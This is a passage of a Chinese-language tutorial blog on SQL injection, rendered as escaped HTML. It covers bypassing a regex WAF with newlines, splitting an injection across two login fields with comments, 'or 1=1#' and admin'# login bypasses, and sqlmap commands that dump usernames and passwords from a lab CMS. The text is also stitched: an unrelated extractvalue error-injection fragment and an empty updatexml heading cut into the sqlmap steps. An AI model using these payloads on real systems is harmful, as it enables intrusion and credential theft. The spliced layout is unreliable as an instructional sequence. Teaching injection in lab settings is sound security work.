&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#e06c75&#34;&gt;preg_match&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$pattern&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;$id&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;检测到攻击，脚本终止！(Attack Detected!)&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT * FROM users WHERE user_id = &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$id&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在这里的过滤中，WAF使用了&lt;code&gt;i&lt;/code&gt;修正符匹配正则&lt;code&gt;select.*from&lt;/code&gt;，意味着大小写绕过无效&lt;/p&gt;
&lt;p&gt;然而，他忘记了使用&lt;code&gt;s&lt;/code&gt;修正符！&lt;/p&gt;
&lt;p&gt;元字符&lt;code&gt;.&lt;/code&gt;可以匹配除换行符以外的任意单个字符，没有使用&lt;code&gt;s&lt;/code&gt;修正符，所以 &lt;code&gt;.&lt;/code&gt; 无法匹配换行符！&lt;/p&gt;
&lt;p&gt;而对于MySQL来说，换行符和空格、制表符一样，都是合法的空白分隔符&lt;/p&gt;
&lt;p&gt;所以，我们可以在查询语句里面插入换行符绕过：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,table_name%0afrom information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39; #
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;												 ↑
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;9-多参数请求绕过双输入表单&#34;&gt;#9 多参数请求绕过（双输入表单）
&lt;/h2&gt;&lt;h3 id=&#34;绕过间隔代码&#34;&gt;绕过间隔代码
&lt;/h3&gt;&lt;p&gt;部分表单（比如登录界面）是通过拼凑用户输入的内容来进行查询的，比如：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$param_a&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$param_b&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT * FROM user WHERE name = &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$param_a&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#39; AND password = &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$param_b&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;WAF可能对单个的内容做了过滤，这时候我们就可以把注入语句拆分&lt;/p&gt;
&lt;p&gt;a部分输入：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union/*
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;b部分输入：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;*/select 1,2#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样拼凑之后的sql语句就是：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;user&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;union&lt;/span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;/*&amp;#39; AND password = &amp;#39;*/&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;														  		  ~~~~~~~~~~~~~~~~~~~~~~~~~
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们就把中间b的部分注释掉了，并且绕过了WAF，成功注入了查询语句&lt;/p&gt;
&lt;h3 id=&#34;万能密码&#34;&gt;万能密码
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;还可以构造出万能密码&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们使用管理员的账号登录，假设是admin，密码输入：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;#39;or 1=1# 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样sql语句就变成了：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;user&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;admin &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;password&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;我们竟然直接登录了管理员的账号，这是为什么呢？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;一般没有进行SQL语句参数化的登录语句是这样的：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;user&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;xxx&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;password&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;xxx&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;数据库管理系统DBMS会判断返回的行数，如果有返回行，证明账号和密码是正确的，即登录成功&lt;/p&gt;
&lt;p&gt;而在我们输入万能密码后，sql语句变成了：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;Select&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;From&lt;/span&gt; 用户表 &lt;span style=&#34;color:#c678dd&#34;&gt;Where&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;UserName&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;xxx&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;and&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Password&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;or是或者的意思，也就是Password=xxx的时候可以登录，也可以是1=1的时候可以登录&lt;/p&gt;
&lt;p&gt;但1永远等于1，所以登录条件永远成立！&lt;/p&gt;
&lt;p&gt;或者换一种方式，我们直接在账号处就使用：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;admin&amp;#39;# 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;密码随便填写，这样sql语句就是：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;user&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39; AND password = &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;xxx&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;完全忽略了密码的校验，也就顺利登录了管理员账号&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:#2c8af0;font-size:20px&#34;&gt;&lt;strong&gt;恭喜，你现在已经学会了手工注入！&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:aqua;font-size:20px&#34;&gt;&lt;strong&gt;呃，可是这也太麻烦了吧，又要判断这个又要试那个的，难道没有更简单的方法吗?&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:#2c8af0;font-size:30px&#34;&gt;&lt;strong&gt;当然是有的！那就是使用自动化注入工具&amp;ndash;SqlMap！&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;sqlmap使用&#34;&gt;SqlMap使用
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;下载地址：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-texttext&#34; data-lang=&#34;texttext&#34;&gt;git clone https://github.com/sqlmapproject/sqlmap.git
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;基本使用步骤&#34;&gt;基本使用步骤
&lt;/h2&gt;&lt;h3 id=&#34;检查注入点&#34;&gt;检查注入点
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;-u：指定目标url&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;&amp;ndash;batch：全自动模式，问什么都答对(y)&lt;/strong&gt;&lt;/mark&gt;`&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; --batch
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627092400221.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250627092400221&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;sqlmap指出它通过四种不同的方式成功注入了目标：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;boolean-based blind&lt;/code&gt; (布尔盲注)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;error-based&lt;/code&gt; (报错注入)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;time-based blind&lt;/code&gt; (时间盲注)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;UNION query&lt;/code&gt; (联合查询注入)&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;而由布尔盲注的&lt;code&gt;payload:id=33 AND 3115=3115&lt;/code&gt;可以看出是数字型注入（id=33周围无单引号）&lt;/p&gt;
&lt;p&gt;由联合查询注入的&lt;code&gt;target URL appears to have 15 columns in query&lt;/code&gt;可以知道一共有十五个字段&lt;/p&gt;
&lt;h3 id=&#34;爆破数据库信息&#34;&gt;爆破数据库信息
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;-dbs：爆破所有的数据库名称&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; --dbs --batch
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627093550491.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250627093550491&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;mark&gt;&amp;ndash;current-db：爆破当前数据库名称&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; --current-db --batch
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627093857366.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250627093857366&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;结果说明现在的表名为cms&lt;/p&gt;
&lt;h3 id=&#34;爆破指定数据库的所有表名&#34;&gt;爆破指定数据库的所有表名
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;-D：指定数据库名&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;&amp;ndash;tables：枚举所有表&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; -D cms --tables  --batch
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627094523174.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250627094523174&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;爆破指定表的所有列名&#34;&gt;爆破指定表的所有列名
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;-T：指定表名&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;&amp;ndash;colums：枚举所有列&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意此处要先指定数据库名，再指定表名：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; -D cms -T cms_users --columns  --batch
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627094938971.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250627094938971&#34;
	
	
&gt;#### extractvalue (XML_document, XPath_string)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一个参数：&lt;code&gt;XML_document&lt;/code&gt; 是目标XML文档&lt;/li&gt;
&lt;li&gt;第二个参数：&lt;code&gt;XPath_string&lt;/code&gt; &lt;strong&gt;是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;user&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;password&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;users&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;where&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;user_id&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;and&lt;/span&gt; (&lt;span style=&#34;color:#e06c75&#34;&gt;extractvalue&lt;/span&gt;(&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;x7e&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;由于0x7e是~的十六进制，而~不属于xpath语法格式，因此会报出xpath语法错误&lt;/p&gt;
&lt;h4 id=&#34;updatexml-xml_document-xpath_string-new_value-1&#34;&gt;updatexml (XML_document, XPath_string, new_value)
&lt;/h4&gt;&lt;h3 id=&#34;打印指定列名的字段数据&#34;&gt;打印指定列名的字段数据
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;-C：指定列名&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;&amp;ndash;dump：取出指定列名的所有数据&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; -D cms -T cms_users -C username,password --dump --batch
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627095213209.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250627095213209&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;查看用户权限&#34;&gt;查看用户权限
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;&amp;ndash;users：列出数据库管理系统用户&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
